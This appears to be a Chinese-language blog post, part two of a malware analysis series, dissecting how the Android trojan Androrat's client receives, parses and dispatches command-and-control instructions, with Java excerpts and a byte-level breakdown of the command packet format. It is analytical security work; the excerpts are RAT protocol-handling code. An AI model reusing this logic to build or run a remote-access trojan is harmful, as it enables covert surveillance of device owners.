@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+  <head>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      剖析安卓木马Androrat（二） &middot; 奇门遁甲
+    
+  </title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/public/css/poole.css">
+  <link rel="stylesheet" href="/public/css/syntax.css">
+  <link rel="stylesheet" href="/public/css/hyde.css">
+  <link rel="stylesheet" href="/public/css/label.css">
+  <link rel="stylesheet" href="/public/css/global.css">
+
+  <!-- Icons -->
+  <link rel="shortcut icon" href="/public/favicon.ico">
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
+
+</head>
+
+
+  <body class="theme-base-ff">
+
+    <div class="sidebar">
+  <div class="container sidebar-sticky">
+    <div class="sidebar-about">
+      <h1>
+        <a href="/">
+          奇门遁甲
+        </a>
+      </h1>
+      <p class="lead"></p>
+    </div>
+
+    <nav class="sidebar-nav">
+      <a class="sidebar-nav-item" href="/">Home</a>
+
+
+      </ul>
+      
+
+      
+      
+        
+          
+        
+      
+        
+          
+            <a class="sidebar-nav-item" href="/about.html">About</a>
+          
+        
+      
+        
+      
+        
+      
+        
+          
+        
+      
+        
+          
+            <a class="sidebar-nav-item" href="/tags.html">标签</a>
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+
+        <a class="sidebar-nav-item" href="/categories.html" >文章分类</a>
+        <ul class="sidebar-nav-subitem">
+            
+            <li><a href="/categories.html#读书">读书 <small>(4)</small></a>
+            </li>
+            
+            <li><a href="/categories.html#随想">随想 <small>(5)</small></a>
+            </li>
+            
+            <li><a href="/categories.html#技术">技术 <small>(9)</small></a>
+            </li>
+            
+            <li><a href="/categories.html#no-category">未分类</a>
+            </li>
+        </ul>
+    </nav>
+
+  </div>
+</div>
+
+
+    <div class="content container">
+      <div class="post">
+  <h1 class="post-title">剖析安卓木马Androrat（二）</h1>
+  <p>
+      <span >09 Apr 2017 by
+          <a href="#">tang3</a>
+      </span>&nbsp;&nbsp;
+      
+  </p>
+  <h2 id="0x00-前言">0x00 前言</h2>
+
+<p>上一篇文章我们分析了Androrat这个木马的Client核心代码，这次我们来聊一聊它是如何解析服务端发过来的命令然后执行的。</p>
+
+<h2 id="0x01-代码分析">0x01 代码分析</h2>
+
+<p>首先我们从上篇文章中提到的onStartCommand函数的这段代码来开始：</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code><span class="n">readthread</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Thread</span><span class="o">(</span><span class="k">new</span> <span class="n">Runnable</span><span class="o">()</span> <span class="o">{</span> <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span> <span class="n">waitInstruction</span><span class="o">();</span> <span class="o">}</span> <span class="o">});</span>
+</code></pre>
+</div>
+
+<p>起一个线程运行waitInstruction方法，这个方法顾名思义，客户端等待服务端的指令，下面让我们来看一下代码：</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code>	<span class="kd">public</span> <span class="kt">void</span> <span class="nf">waitInstruction</span><span class="o">()</span> <span class="o">{</span> <span class="c1">//Le thread sera bloqué dedans</span>
+		<span class="k">try</span> <span class="o">{</span>
+			<span class="k">for</span><span class="o">(;;)</span> <span class="o">{</span>
+				<span class="k">if</span><span class="o">(</span><span class="n">stop</span><span class="o">)</span>
+					<span class="k">break</span><span class="o">;</span>
+				<span class="n">conn</span><span class="o">.</span><span class="na">getInstruction</span><span class="o">()</span> <span class="o">;</span>
+			<span class="o">}</span>
+		<span class="o">}</span>
+		<span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span> 
+			<span class="n">isListening</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+			<span class="n">resetConnectionAttempts</span><span class="o">();</span>
+			<span class="n">reconnectionAttempts</span><span class="o">();</span>
+			<span class="k">if</span><span class="o">(</span><span class="n">waitTrigger</span><span class="o">)</span> <span class="o">{</span>
+				<span class="n">registerSMSAndCall</span><span class="o">();</span>
+			<span class="o">}</span>
+		<span class="o">}</span>
+	<span class="o">}</span>
+</code></pre>
+</div>
+
+<p>循环执行Connection的getInstruction来接收指令，直到stop成员变量被置为true。如果抛出异常，则尝试重新连接到服务端。下面我们接着来看Connection的getInstruction代码：</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code>	<span class="kd">public</span> <span class="n">ByteBuffer</span> <span class="nf">getInstruction</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span>
+	<span class="o">{</span>
+		<span class="n">readInstruction</span> <span class="o">=</span> <span class="n">receive</span><span class="o">.</span><span class="na">read</span><span class="o">();</span>
+		
+		<span class="k">if</span><span class="o">(</span><span class="n">dem</span><span class="o">.</span><span class="na">receive</span><span class="o">(</span><span class="n">readInstruction</span><span class="o">))</span>
+			<span class="n">readInstruction</span><span class="o">.</span><span class="na">compact</span><span class="o">();</span>
+		<span class="k">else</span>
+			<span class="n">readInstruction</span><span class="o">.</span><span class="na">clear</span><span class="o">();</span>
+		
+		<span class="k">return</span> <span class="n">readInstruction</span><span class="o">;</span>
+	<span class="o">}</span>
+</code></pre>
+</div>
+
+<p>读取缓冲区中的数据，然后解码输入数据，判断解码是否成功，最后返回空缓冲区。用于解码输入数据的receive方法的代码如下：</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code>	<span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">receive</span><span class="o">(</span><span class="n">ByteBuffer</span> <span class="n">buffer</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span>
+	<span class="o">{</span>
+
+		<span class="k">while</span> <span class="o">(</span><span class="n">reading</span><span class="o">)</span> <span class="o">{</span>
+			
+	
+				<span class="k">if</span><span class="o">(!</span><span class="n">partialDataExpected</span><span class="o">)</span>
+					<span class="c1">//si on n'attend pas de donn�es partielles(dans le cas d'un paquet pas re�ue enti�rement)</span>
+				<span class="o">{</span>	
+						<span class="c1">// si la taille du buffer est insuffisante</span>
+						<span class="k">if</span> <span class="o">((</span><span class="n">buffer</span><span class="o">.</span><span class="na">limit</span><span class="o">()</span> <span class="o">-</span> <span class="n">buffer</span><span class="o">.</span><span class="na">position</span><span class="o">())</span> <span class="o">&lt;</span> <span class="n">Protocol</span><span class="o">.</span><span class="na">HEADER_LENGTH_DATA</span><span class="o">)</span> 
+						<span class="o">{</span>
+							
+							<span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+						<span class="o">}</span>
+				<span class="o">}</span>
+	
+				<span class="c1">// dans le cas d'un paquet partiellement recue</span>
+				<span class="k">if</span> <span class="o">(</span><span class="n">partialDataExpected</span><span class="o">)</span>
+					<span class="n">partialDataExpected</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="na">parseCompleter</span><span class="o">(</span><span class="n">buffer</span><span class="o">);</span>
+				<span class="k">else</span> 
+				<span class="o">{</span>
+					<span class="n">p</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TransportPacket</span><span class="o">();</span>
+					<span class="n">partialDataExpected</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">buffer</span><span class="o">);</span>
+				<span class="o">}</span>
+				
+				
+				
+				<span class="k">if</span> <span class="o">(</span><span class="n">partialDataExpected</span><span class="o">)</span>
+					<span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+				<span class="k">else</span>
+					<span class="n">controler</span><span class="o">.</span><span class="na">Storage</span><span class="o">(</span><span class="n">p</span><span class="o">,</span> <span class="n">imei</span><span class="o">);</span>
+			
+		<span class="o">}</span>
+
+
+		<span class="n">reading</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+		<span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+	<span class="o">}</span>
+</code></pre>
+</div>
+
+<p>如果数据没有异常，则判断缓冲限制大小减去当前游标所在缓冲位置（即将要读取的数据）是否小于传输协议中包头的长度，如果小于（不符合协议），则返回。后面继续判断数据是否异常，如果存在，则使用TransportPacket类中的parseCompleter方法对数据进行读取操作，并将是否处理成功返回给partialDataExpected变量。如果数据没有异常，则实例化TransportPacket对象，并调用TransportPacket的parse方法对数据进行解析和读取数据body，最终头部信息有一个int作为totalLength、一个int作为localLength、一个byte作为lst、一个short作为NumSeq、一个int作为channel，其余部分作为body存储到一个byte数组当中（后面我们会具体的讲它们各个位的作用）。parse代码如下：</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code>	<span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">parse</span><span class="o">(</span><span class="n">ByteBuffer</span> <span class="n">buffer</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+		
+
+		<span class="n">totalLength</span> <span class="o">=</span> <span class="n">buffer</span><span class="o">.</span><span class="na">getInt</span><span class="o">();</span>
+		<span class="n">localLength</span> <span class="o">=</span> <span class="n">buffer</span><span class="o">.</span><span class="na">getInt</span><span class="o">();</span>
+
+		<span class="kt">byte</span> <span class="n">lst</span> <span class="o">=</span> <span class="n">buffer</span><span class="o">.</span><span class="na">get</span><span class="o">();</span>
+		<span class="k">if</span> <span class="o">(</span><span class="n">lst</span> <span class="o">==</span> <span class="mi">1</span><span class="o">)</span>
+			<span class="n">last</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+		<span class="k">else</span>
+			<span class="n">last</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+
+		<span class="n">NumSeq</span> <span class="o">=</span> <span class="n">buffer</span><span class="o">.</span><span class="na">getShort</span><span class="o">();</span>
+		<span class="n">channel</span> <span class="o">=</span> <span class="n">buffer</span><span class="o">.</span><span class="na">getInt</span><span class="o">();</span>
+		<span class="cm">/*
+		System.out.println("Taille totale de la donn�e : " + totalLength);
+		System.out.println("Taille des donn�es du paquet : " + localLength);
+		System.out.println("Dernier paquet : " + last);
+		System.out.println("Position du paquet : " + NumSeq);
+		System.out.println("Canal:" + channel);
+		System.out.println("Recuperation de la donnee");
+		*/</span>
+		<span class="c1">// si la place restante dans le buffer est insuffisante</span>
+		<span class="k">if</span> <span class="o">((</span><span class="n">buffer</span><span class="o">.</span><span class="na">limit</span><span class="o">()</span> <span class="o">-</span> <span class="n">buffer</span><span class="o">.</span><span class="na">position</span><span class="o">())</span> <span class="o">&lt;</span> <span class="n">localLength</span><span class="o">)</span> <span class="o">{</span>
+			
+			<span class="n">dataFilling</span><span class="o">(</span><span class="n">buffer</span><span class="o">,</span> <span class="n">buffer</span><span class="o">.</span><span class="na">limit</span><span class="o">()</span> <span class="o">-</span> <span class="n">buffer</span><span class="o">.</span><span class="na">position</span><span class="o">());</span>
+			<span class="c1">//System.out.println("une partie du packet a ete sauvegarde");</span>
+			<span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+			
+		<span class="o">}</span> 
+		<span class="k">else</span> 
+		<span class="o">{</span>
+			<span class="c1">// s'il y a assez de place, on sauvegarde tout le paquet</span>
+				<span class="n">data</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">localLength</span><span class="o">];</span>
+				<span class="n">buffer</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">data</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">data</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+				<span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+			
+		<span class="o">}</span>
+
+	<span class="o">}</span>
+</code></pre>
+</div>
+
+<p>我们继续向下看receive最后的代码，判断数据是否异常，如果没有异常则调用controler（即Client）的Storage方法，将刚才处理数据的TransportPacket实例作为参数传递到Storage方法中。下面我们直接来看Storage的代码：</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code>	<span class="kd">public</span> <span class="kt">void</span> <span class="nf">Storage</span><span class="o">(</span><span class="n">TransportPacket</span> <span class="n">p</span><span class="o">,</span> <span class="n">String</span> <span class="n">i</span><span class="o">)</span> 
+	<span class="o">{</span>
+		<span class="k">try</span>
+		<span class="o">{</span>
+			<span class="n">packet</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CommandPacket</span><span class="o">();</span> <span class="c1">//!!!!!!!!!!!! Sinon on peut surement en valeur les arguments des command précédantes !</span>
+			<span class="n">packet</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">p</span><span class="o">.</span><span class="na">getData</span><span class="o">());</span>
+			
+			<span class="n">Message</span> <span class="n">mess</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Message</span><span class="o">();</span>
+			<span class="n">Bundle</span> <span class="n">b</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Bundle</span><span class="o">();</span>
+			<span class="n">b</span><span class="o">.</span><span class="na">putShort</span><span class="o">(</span><span class="s">"command"</span><span class="o">,</span> <span class="n">packet</span><span class="o">.</span><span class="na">getCommand</span><span class="o">());</span>
+			<span class="n">b</span><span class="o">.</span><span class="na">putByteArray</span><span class="o">(</span><span class="s">"arguments"</span><span class="o">,</span> <span class="n">packet</span><span class="o">.</span><span class="na">getArguments</span><span class="o">());</span>
+			<span class="n">b</span><span class="o">.</span><span class="na">putInt</span><span class="o">(</span><span class="s">"chan"</span><span class="o">,</span> <span class="n">packet</span><span class="o">.</span><span class="na">getTargetChannel</span><span class="o">());</span>
+			<span class="n">mess</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="n">b</span><span class="o">);</span>
+			<span class="n">handler</span><span class="o">.</span><span class="na">sendMessage</span><span class="o">(</span><span class="n">mess</span><span class="o">);</span>
+		<span class="o">}</span>
+		<span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span>
+		<span class="o">{</span>
+			<span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Androrat.Client.storage : pas une commande"</span><span class="o">);</span>
+		<span class="o">}</span>		
+	<span class="o">}</span>
+</code></pre>
+</div>
+
+<p>先实例化一个CommandPacket对象，用它的parese方法解析数据，这回是解析数据的body部分，先看代码：</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code>	<span class="kd">public</span> <span class="kt">void</span> <span class="nf">parse</span><span class="o">(</span><span class="n">ByteBuffer</span> <span class="n">b</span><span class="o">)</span> <span class="o">{</span>
+		<span class="k">this</span><span class="o">.</span><span class="na">commande</span> <span class="o">=</span> <span class="n">b</span><span class="o">.</span><span class="na">getShort</span><span class="o">();</span>
+		<span class="k">this</span><span class="o">.</span><span class="na">targetChannel</span> <span class="o">=</span> <span class="n">b</span><span class="o">.</span><span class="na">getInt</span><span class="o">();</span>
+		<span class="k">this</span><span class="o">.</span><span class="na">argument</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">b</span><span class="o">.</span><span class="na">remaining</span><span class="o">()];</span>
+		<span class="n">b</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">argument</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">b</span><span class="o">.</span><span class="na">remaining</span><span class="o">());</span>
+	<span class="o">}</span>
+</code></pre>
+</div>
+
+<p>取body部分第一个short作为命令，取之后的一个int参数作为channel，剩下的内容作为参数。</p>
+
+<p>然后通过使用Message将内容传递到handler.sendMessage方法中，在这个方法中只有唯一的一个操作，就是调用processCommand处理参数中所带内容。而processCommand方法的操作是，调用在Client中定义的procCmd实例，执行它的process方法，参数顺序为，命令、参数、channel。process方法代码有些长，我们截取部分来看，代码如下：</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code><span class="kd">public</span> <span class="kt">void</span> <span class="nf">process</span><span class="o">(</span><span class="kt">short</span> <span class="n">cmd</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">args</span><span class="o">,</span> <span class="kt">int</span> <span class="n">chan</span><span class="o">)</span>
+	<span class="o">{</span>
+		<span class="k">this</span><span class="o">.</span><span class="na">commande</span> <span class="o">=</span> <span class="n">cmd</span><span class="o">;</span>
+		<span class="k">this</span><span class="o">.</span><span class="na">chan</span> <span class="o">=</span> <span class="n">chan</span><span class="o">;</span>
+		<span class="k">this</span><span class="o">.</span><span class="na">arguments</span> <span class="o">=</span> <span class="n">ByteBuffer</span><span class="o">.</span><span class="na">wrap</span><span class="o">(</span><span class="n">args</span><span class="o">);</span>
+		
+		<span class="k">if</span> <span class="o">(</span><span class="n">commande</span> <span class="o">==</span> <span class="n">Protocol</span><span class="o">.</span><span class="na">GET_GPS_STREAM</span><span class="o">)</span>
+		<span class="o">{</span>
+			<span class="n">String</span> <span class="n">provider</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">arguments</span><span class="o">.</span><span class="na">array</span><span class="o">());</span>
+
+			<span class="k">if</span> <span class="o">(</span><span class="n">provider</span><span class="o">.</span><span class="na">compareTo</span><span class="o">(</span><span class="s">"network"</span><span class="o">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">provider</span><span class="o">.</span><span class="na">compareTo</span><span class="o">(</span><span class="s">"gps"</span><span class="o">)</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+				<span class="n">client</span><span class="o">.</span><span class="na">gps</span> <span class="o">=</span> <span class="k">new</span> <span class="n">GPSListener</span><span class="o">(</span><span class="n">client</span><span class="o">,</span> <span class="n">provider</span><span class="o">,</span> <span class="n">chan</span><span class="o">);</span>
+				<span class="n">client</span><span class="o">.</span><span class="na">sendInformation</span><span class="o">(</span><span class="s">"Location request received"</span><span class="o">);</span>
+			<span class="o">}</span>
+			<span class="k">else</span>
+				<span class="n">client</span><span class="o">.</span><span class="na">sendError</span><span class="o">(</span><span class="s">"Unknown provider '"</span><span class="o">+</span><span class="n">provider</span><span class="o">+</span><span class="s">"' for location"</span><span class="o">);</span>
+			
+		<span class="o">}</span>
+		<span class="cm">/* 省略部分代码 */</span>
+		<span class="k">else</span> <span class="nf">if</span><span class="o">(</span><span class="n">commande</span> <span class="o">==</span> <span class="n">Protocol</span><span class="o">.</span><span class="na">DISCONNECT</span><span class="o">)</span> <span class="o">{</span>
+			<span class="n">client</span><span class="o">.</span><span class="na">onDestroy</span><span class="o">();</span>
+		<span class="o">}</span>
+		<span class="k">else</span> <span class="o">{</span>
+			<span class="n">client</span><span class="o">.</span><span class="na">sendError</span><span class="o">(</span><span class="s">"Command: "</span><span class="o">+</span><span class="n">commande</span><span class="o">+</span><span class="s">" unknown"</span><span class="o">);</span>
+		<span class="o">}</span>
+			
+	<span class="o">}</span>
+</code></pre>
+</div>
+
+<p>代码很简单，通过if和else if判断应执行哪一条命令，然后调用其中的具体操作。如果收到断开连接的命令，则调用Client的onDestroy方法来关闭连接。</p>
+
+<h3 id="0x02-服务端发送指令格式">0x02 服务端发送指令格式</h3>
+
+<p>我们以读取文件树的指令为例，来看指令结构：</p>
+
+<p><img src="/assets/images/2017-04/hexdata.png" alt="datahex" /></p>
+
+<p>按照上面分析代码的过程，我们可以把指令切割为如下：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>totalLength  :00 00 00 07  ==》总共长度，如果分片传递则大于localLength
+localLength  :00 00 00 07  ==》本包长度
+lst          :01           ==》是否为最后一个包
+NumSeq       :00 00        ==》如果是分片，则表示此包为第几个数据包
+channel      :00 00 00 00  ==》服务端所使用的频道
+commande     :00 07        ==》命令
+targetChannel:00 00 03 8f  ==》返回数据发送到的频道
+argument     :2f           ==》执行命令所用到的参数
+</code></pre>
+</div>
+
+<p>至于commande（作者拼错了吧？）中各个数值，大家可以到Protocol.java文件中去看，内容太长，我就不在这里贴了。</p>
+
+<h2 id="0x03-总结">0x03 总结</h2>
+
+<p>关于Androrat木马客户端接受服务端指令的过程，我们已经分析完了。除了客户端如何构造数据包，将信息发送至服务端这个功能还值得一说，其他的代码就没什么要说的必要了。下篇文章我打算把构造向服务端发送数据包的代码分析一下，然后再整体的对这个木马的结构进行一下分析，画一下结构图什么的。</p>
+
+<p>至于其他功能性的代码，其实和正常的Android软件开发没什么区别。如果感兴趣，建议大家去看上篇文章提到的那个教程。如果有时间，我也可能会翻译过来。</p>
+
+<p><strong>从我分析的这个算是比较流行的木马情况来看，恶意软件还是处于刚刚开始的阶段，代码实现方向还是以基础功能性为主，对抗相关的内容很少，或者说是几乎没有。</strong></p>
+
+</div>
+
+<div class="related">
+  <h2>相关文章:</h2>
+  <ul class="related-posts">
+    
+    
+      <li>
+        <h3>
+          <a href="/%E6%8A%80%E6%9C%AF/2017/04/09/%E5%89%96%E6%9E%90%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%ACAndrorat-%E7%BB%88.html">
+            剖析安卓木马Androrat（终）
+            <small>09 Apr 2017</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/%E6%8A%80%E6%9C%AF/2017/04/09/%E5%89%96%E6%9E%90%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%ACAndrorat-%E4%B8%80.html">
+            剖析安卓木马Androrat（一）
+            <small>09 Apr 2017</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/%E6%8A%80%E6%9C%AF/2017/03/21/%E4%B9%9F%E8%B0%88S2-045.html">
+            也谈S2-045
+            <small>21 Mar 2017</small>
+          </a>
+        </h3>
+      </li>
+    
+    
+  </ul>
+</div>
+
+
+<!-- UY BEGIN -->
+<div id="uyan_frame"></div>
+<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2093529"></script>
+<!-- UY END -->
+
+    </div>
+
+  </body>
+</html>
